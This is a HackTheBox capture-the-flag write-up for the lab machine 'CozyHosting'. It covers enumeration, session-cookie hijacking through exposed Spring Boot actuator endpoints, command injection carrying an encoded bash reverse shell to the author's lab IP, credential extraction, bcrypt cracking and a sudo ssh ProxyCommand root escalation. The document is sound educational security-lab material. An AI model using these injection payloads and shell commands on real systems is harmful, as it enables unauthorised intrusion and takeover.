---
date: 2024-02-29
title: CozyHosting HTB Write-Up
machine_ip: 10.10.11.230
os: Linux
difficulty: Easy
my_rating: 4
tags:
  - "#Web"
  - "#BurpeSuite"
  - RCE
references: "[[📚CTF Box Writeups]]"
---

I acquired hints throughout this box, it was close to expiring when I started it (<2 days), so I treated it as a retired box to learn as much as possible.

### Enumeration

I begin my initial enumeration with an nmap scan:

```
-[Tue Feb 27-13:46:47]-[table@parrot]-
-[~]$ nmap -sV -sC -T5 10.10.11.230
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 13:46 PST
Nmap scan report for 10.10.11.230
Host is up (0.082s latency).
Not shown: 998 closed tcp ports (conn-refused)

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_ 256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds
```

Now, lets enumerate directories with gobuster:

```
-[Tue Feb 27-13:49:14]-[table@parrot]-
-[~]$ gobuster dir -u http://cozyhosting.htb/ --wordlist /usr/share/dirb/wordlists/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://cozyhosting.htb/
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.6
[+] Timeout: 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin (Status: 401) [Size: 97]
/error (Status: 500) [Size: 73]
/index (Status: 200) [Size: 12706]
/login (Status: 200) [Size: 4431]
/logout (Status: 204) [Size: 0]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

And determine the technologies on the website using whatweb:

```
-[Wed Feb 28-15:57:13]-[table@parrot]-
-[~]$ whatweb http://cozyhosting.htb/

http://cozyhosting.htb/ [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Email[info@cozyhosting.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.230], Lightbox, Script, Title[Cozy Hosting - Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
```

With this, I started to get confident and thought maybe I would brute force the login page using the BurpSuite Intruder tab. This would be better if the BurpSuite CE wasn't rate-limited. It was taking a long time to go through 168 million possibilities so I stopped that process.

Now I will try to enumerate using the http enumeration nmap script, `--script=http-enum`:

```-[Wed Feb 28-16:07:37]-[table@parrot]-
-[~]$ nmap -sV --script=http-enum 10.10.11.230

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 16:43 PST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.085s latency).
Not shown: 996 closed tcp ports (conn-refused)

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-enum:
| //system.html: CMNC-200 IP Camera
| /Citrix//AccessPlatform/auth/clientscripts/cookies.js: Citrix
| /.nsf/../winnt/win.ini: Lotus Domino
| /uir//etc/passwd: Possible D-Link router directory traversal vulnerability (CVE-2018-10822)
|_ /uir//tmp/csman/0: Possible D-Link router plaintext password file exposure (CVE-2018-10824)
9000/tcp open cslistener?
9999/tcp open abyss?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 278.74 seconds
```

We get two listed vulnerabilities so let's investigate them:

### Further Recon of Exploits

First, researching CVE-2018-10822, this vulnerability allows for directory traversal in the web interface on D-Link DWR-116 through 1.06, DIR-140L through 1.02, DIR-640L through 1.02, DWR-512 through 2.02, DWR-712 through 2.02, DWR-912 through 2.02, DWR-921 through 2.02, and DWR-111 through 1.01 devices. We can read arbitrary files via a `/..` or `//` after `"GET /uir"` in an HTTP request:

`GET /uri//etc/passwd`

Maybe it worked since it is not returning an error page? There is more to do to see the contents. Let's research the CVE-2018-10824 vulnerability. It appears the administrative password is stored in plaintext in the /tmp/csman/0 file.

`curl -X GET "http://cozyhosting.htb/uri//tmp/csman/0"`

No luck there, further research is needed.

I found a GitHub for a .yaml file relating to CVE-2018-10822. In the code, I noticed the reference to exploit-db exploit #45678.

Using searchsploit we find an exploit to try:

```
-[Wed Feb 28-17:19:34]-[table@parrot]-
-[~]$ searchsploit 45678
-------------------------------------------------------------------------------------------- ---------------------------------
Exploit Title | Path
-------------------------------------------------------------------------------------------- ---------------------------------
D-Link Routers - Directory Traversal | hardware/webapps/45678.md
-------------------------------------------------------------------------------------------- ---------------------------------
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcode Title | Path
-------------------------------------------------------------------------------------------- ---------------------------------
Linux/x64 - Bind_tcp (0.0.0.0:4444) + Password (12345678) + Shell (/bin/sh) Shellcode (142 | linux/49472.c
-------------------------------------------------------------------------------------------- ---------------------------------
Papers: No Results
```

From the research, it is interesting to note that the vulnerability can be used to retrieve administrative passwords using the other disclosed vulnerability - CVE-2018-10824.

This vulnerability was reported previously by Patryk Bogdan in CVE-2017-6190 but he reported it is fixed in certain releases but unfortunately, it is still present in even newer releases. The vulnerability is also present in other D-Link routers and can be exploited not only (as the original author stated) by double dot but also using double slash.

Let's try to curl the IP address file location of passwd:

```
-[Wed Feb 28-17:23:50]-[table@parrot]-
-[~]$ curl http://10.10.11.230/uir//etc/passwd
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

Interestingly, we can check online to see if searching the previously known vulnerability that was not fixed, CVE-2017-6190, yields anything more.

We find in exploit-db exploit #41840, we see:

```HTTP Request:

GET /uir/../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1

Host: 192.168.2.1

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close

HTTP Response:

HTTP/1.0 200 OK

Content-Type: application/x-none

Cache-Control: max-age=60

Connection: close

root:$1$$taUxCLWfe3rCh2ylnFWJ41:0:0:root:/root:/bin/ash

nobody:$1$$qRPK7m23GJusamGpoGLby/:99:99:nobody:/var/usb:/sbin/nologin

ftp:$1$$qRPK7m23GJusamGpoGLby/:14:50:FTP USER:/var/usb:/sbin/nologin
```

This feels like the right path, but we must think harder on this. We could use the curl command again and follow the redirect with `-L` tag.

Doing this takes us to the homepage, not helpful.

Using `curl` we find out Bootstrap's version Bootstrap v5.2.3. Searching for vulnerabilities, I find there are no direct vulnerabilities.

Hint obtained: Need more directory enumeration...

Web Directory Enumeration Continued

There is a Whitelabel Error page, meaning no explicit mapping for `/error`. Researching this further, I found out that the Whitelabel error page is a result of the website's structure, by default, Spring Boot will scan the components below the main application class. I also found that as of Spring Boot 2.0.0.RELEASE the default prefix for all endpoints is `/actuator`.

So, let's check that URL. Ah, we see sessions. That is promising, let's navigate there:

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FskdByKhrTDrekGP0vU0U%2Fuploads%2FGtCHMyjBQxyUWyagiLR2%2Fimage.png?alt=media&token=ceb362f9-0a99-4856-aef0-46175d1a1075)


With this, we have the cookies for a user `"kanderson"`. Now we can manipulate the session cookies using BurpSuite and gain access to the admin dashboard.

However, being that I missed the `/actuator` directory earlier in my recon, I decided to enumerate more. Maybe there is more to find:

```-[Thu Feb 29-09:07:26]-[table@parrot]-
-[~]$ dirsearch -u http://cozyhosting.htb
_|. _ _ _ _ _ _|_ v0.4.2
(_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
Output File: /home/table/.dirsearch/reports/cozyhosting.htb/_24-02-29_09-08-35.txt
Error Log: /home/table/.dirsearch/logs/errors-24-02-29_09-08-35.log
Target: http://cozyhosting.htb/
[09:08:36] Starting:
[09:08:42] 200 - 0B - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[09:08:44] 400 - 435B - /\..\..\..\..\..\..\..\..\..\etc\passwd
[09:08:44] 400 - 435B - /a%5c.aspx
[09:08:45] 200 - 634B - /actuator
[09:08:45] 200 - 5KB - /actuator/env
[09:08:45] 200 - 15B - /actuator/health
[09:08:45] 200 - 10KB - /actuator/mappings
[09:08:45] 200 - 48B - /actuator/sessions
[09:08:45] 200 - 124KB - /actuator/beans
[09:08:45] 401 - 97B - /admin
[09:08:55] 200 - 0B - /engine/classes/swfupload//swfupload_f9.swf
[09:08:55] 200 - 0B - /engine/classes/swfupload//swfupload.swf
[09:08:55] 500 - 73B - /error
[09:08:55] 200 - 0B - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[09:08:55] 200 - 0B - /extjs/resources//charts.swf
[09:08:57] 200 - 0B - /html/js/misc/swfupload//swfupload.swf
[09:08:57] 200 - 12KB - /index
[09:08:59] 200 - 4KB - /login
[09:08:59] 200 - 0B - /login.wdm%2e
[09:08:59] 204 - 0B - /logout
[09:09:05] 400 - 435B - /servlet/%C0%AE%C0%AE%C0%AF

Task Completed

```

There is more out put from `dirsearch`. This tool finds more than `gobuster` so I will use this more.

### Exploitation

With a sessions cookie, we can now log in as the user `"kanderson"`.

Figuring out what to edit and change took some time for me as I am still very new. I received another hint which helped me in the following.

Using BurpSuite Repeater we send the request to the Repeater tab, change the request header from `POST /login HTTP/1.1` to `GET /admin HTTP/1.1` and add the `Cookie: JSESSIONID=<session_cookie>` to the request header:

![](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FskdByKhrTDrekGP0vU0U%2Fuploads%2F5hDrYfRie29Ow3jGfnJJ%2Fimage.png?alt=media&token=57083118-3c63-472a-91c7-d0f627944648)


In the raw HTML for the admin dashboard, we see that "Connection Settings" has an action assigned as `/executessh`. This did not appear in the `dirsearch`. I spent some time trying to figure this out as I was using the wrong requests in my repeater trying different combinations to get the `/executessh` to show anything other than an error page.

Let's start by adding to our request header a host and username. I am changing it to a `POST` request and try my host IP and a blank username:

```HTTP/1.1 302

Server: nginx/1.18.0 (Ubuntu)

Date: Thu, 29 Feb 2024 17:40:11 GMT

Content-Length: 0

Location: http://cozyhosting.htb/admin?error=usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] destination [command [argument ...]]

Connection: close

X-Content-Type-Options: nosniff

X-XSS-Protection: 0

Cache-Control: no-cache, no-store, max-age=0, must-revalidate

Pragma: no-cache

Expires: 0

X-Frame-Options: DENY

```

In the location attribute, we get an error relating to ssh. Again, I receive another hint and determine that there is an exploit here, likely a payload in username or host IP, so do more research.

I came across a payload to put into the username field:
```
;echo${IFS}"[ PAYLOAD ]"|base64${IFS}-d|bash;

```

For the payload, I want to send a bash shell to my IP at port 4444. To do that I need this command in base64 and then I replace it in the `[ PAYLOAD ]` placeholder above:

```
"bash -i >& /dev/tcp/10.10.14.83/4444 0>&1"

```

We need to encode the payload to base64, and then the whole command in URL format:

```
-[Thu Feb 29-09:07:19]-[table@parrot]-
-[~]$ echo "bash -i >& /dev/tcp/10.10.14.83/4444 0>&1" | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44My80NDQ0IDA+JjEK
```

The base64 payload inserted into our command:

```
;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44My80NDQ0IDA+JjEK"|base64${IFS}-d|bash;
```

Full command payload, encoded into URL to insert in username:

```
%3Becho%24%7BIFS%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC44My80NDQ0IDA%2BJjEK%22%7Cbase64%24%7BIFS%7D-d%7Cbash%3B
```

After sending the payload, and having `netcat` listening on port 4444, we catch a reverse shell!

```
-[Thu Feb 29-09:37:07]-[table@parrot]-
-[~]$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.83] from (UNKNOWN) [10.10.11.230] 54708
bash: cannot set terminal process group (1063): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ id
uid=1001(app) gid=1001(app) groups=1001(app)
app@cozyhosting:/app$
```

We find a `.jar` file in `/app`. We cannot view it remotely so I download it onto the remote host to view it:

```
-[Thu Feb 29-09:55:59]-[table@parrot]-
-[~]$ wget 10.10.11.230/app/cloudhosting-0.0.1.jar
--2024-02-29 09:56:43-- http://10.10.11.230/app/cloudhosting-0.0.1.jar
Connecting to 10.10.11.230:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://cozyhosting.htb [following]
--2024-02-29 09:56:43-- http://cozyhosting.htb/
Resolving cozyhosting.htb (cozyhosting.htb)... 10.10.11.230
Reusing existing connection to 10.10.11.230:80.
HTTP request sent, awaiting response... 200
Length: unspecified [text/html]
Saving to: ‘cloudhosting-0.0.1.jar’
cloudhosting-0.0.1.jar [ <=> ] 12.41K --.-KB/s in 0.08s
2024-02-29 09:56:43 (150 KB/s) - ‘cloudhosting-0.0.1.jar’ saved [12706]
```

Unsure what to do with `.jar`. Taking a hint, I learned I need `jd-gui` to view jar files better. Unfortunately, `jd-gui` is not working, the `.jar` file does not open in this app. When I `cat` the file it shows the HTML for the home page

It turns out that my syntax for `wget` was incorrect and I forgot to start a web server on the remote host.

Creating a web server from the remote host on port 9882:

```app@cozyhosting:/app$ python3 -m http.server 9882

python3 -m http.server 9882

10.10.14.83 - - [29/Feb/2024 18:14:01] "GET /cloudhosting-0.0.1.jar HTTP/1.1" 200 -
```

Grabbing the file from my local host using wget:

```
-[Thu Feb 29-10:13:56]-[table@parrot]-
-[~]$ wget 10.10.11.230:9882/cloudhosting-0.0.1.jar
--2024-02-29 10:14:02-- http://10.10.11.230:9882/cloudhosting-0.0.1.jar
Connecting to 10.10.11.230:9882... connected.
HTTP request sent, awaiting response... 200 OK
Length: 60259688 (57M) [application/java-archive]
Saving to: ‘cloudhosting-0.0.1.jar’
cloudhosting-0.0.1.jar 100%[=====================================================>] 57.47M 17.4MB/s in 3.5s
2024-02-29 10:14:06 (16.6 MB/s) - ‘cloudhosting-0.0.1.jar’ saved [60259688/60259688]
```

Now that I have the .jar file, I can unzip it and read the contents. Inside the .jar extract, we find a file containing postgres credentials:

```
-[Thu Feb 29-10:16:55]-[table@parrot]-
-[~/BOOT-INF/classes]$ cat application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Using this information we can assume there may be a postgres port open on the target machine and try to log in with the credentials:

```
app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres
psql -h 127.0.0.1 -U postgres
Password for user postgres: Vg&nvzAQ7XxR
\list
List of databases
Name | Owner | Encoding | Collate | Ctype | Access privileges
-------------+----------+----------+-------------+-------------+-----------------------
cozyhosting | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 |
postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 |
template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres +
| | | | | postgres=CTc/postgres
template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres +
| | | | | postgres=CTc/postgres
(4 rows)
```

Success, now let's search more.

We find a users table in the cozyhosting database containing the `"admin"` password and `"kanderson"` password. These are hashed so we must unhash them.

```
\c cozyhosting
You are now connected to database "cozyhosting" as user "postgres".
\d
List of relations
Schema | Name | Type | Owner
--------+--------------+----------+----------
public | hosts | table | postgres
public | hosts_id_seq | sequence | postgres
public | users | table | postgres
(3 rows)
select * from users;
name | password | role
-----------+--------------------------------------------------------------+-------
kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

To unhash, I save the passwords to hash.txt and run them on john (a new tool to me so wanted to try it). Using ChatGPT, I determined what type of encryption the hash is. It is encrypted with bcrypt.

Using john to crack the hashes, it found one password I can try `"manchesterunited"`.

```
-[Thu Feb 29-10:50:39]-[table@parrot]-
-[~]$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)
```

I tried to log in to the web portal as `"admin"` with that password. No luck. I noticed a user directory in the `/home` folder named josh. I try to login as josh with `su josh`:

```
app@cozyhosting:/$ cd /home
cd /home
app@cozyhosting:/home$ ls
ls
josh
app@cozyhosting:/home$ su josh
su josh
Password: manchesterunited
python3 -c 'import pty; pty.spawn("/bin/bash")'
josh@cozyhosting:~$ ls
ls
user.txt
josh@cozyhosting:~$ cat user.txt
cat user.txt
70ed2ab8d4ac574e826b6dd914267bc9
User flag = 70ed2ab8d4ac574e826b6dd914267bc9
```

Success! Now that we have the user flag, we continue to wait for the admin hash to crack.

### Priv Esc

Using `sudo -l` we can check our options to escalate from the user `"josh"`:

```
josh@cozyhosting:~$ sudo -l
sudo -l
[sudo] password for josh: manchesterunited
Matching Defaults entries for josh on localhost:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_pty
User josh may run the following commands on localhost:
(root) /usr/bin/ssh *
```

It appears we can run ssh as root.

After many hours, a hint later, and doing more research I found something. Using the GTFObins.github.io website, if I want to spawn an interactive shell through the ProxyCommand option, I can do that.

I want to do that, so I use the command provided on the website:

```
josh@cozyhosting:~$ ssh -o ProxyCommand=';sh 0<&2 1>&2' x
ssh -o ProxyCommand=';sh 0<&2 1>&2' x
$ id
id
uid=1003(josh) gid=1003(josh) groups=1003(josh
```

Seems like I am missing something. I was not thinking and typed `ssh` instead of `sudo`. I also was missing the directory that `"josh"` has root access to use `ssh` through. Let's change it up:

```
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
[sudo] password for josh: manchesterunited
# id
id
uid=0(root) gid=0(root) groups=0(root)
# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
root@cozyhosting:/home/josh#
```

Success! Let's find the final flag:

```
root@cozyhosting:/home/josh# cd /root
cd /root
root@cozyhosting:~# ls
ls
root.txt
root@cozyhosting:~# cat root.txt
cat root.txt
148ad8c88d9154952e4957e6c0454ffc
```

Root flag = <mark style="background-color:green;">148ad8c88d9154952e4957e6c0454ffc</mark>




*This was a fun box. If the box was not retiring so soon, I would have spent more time on it and gotten fewer hints. Regardless I learned a lot and had a blast using BurpSuite and the `john` tool to crack the hash. Onward!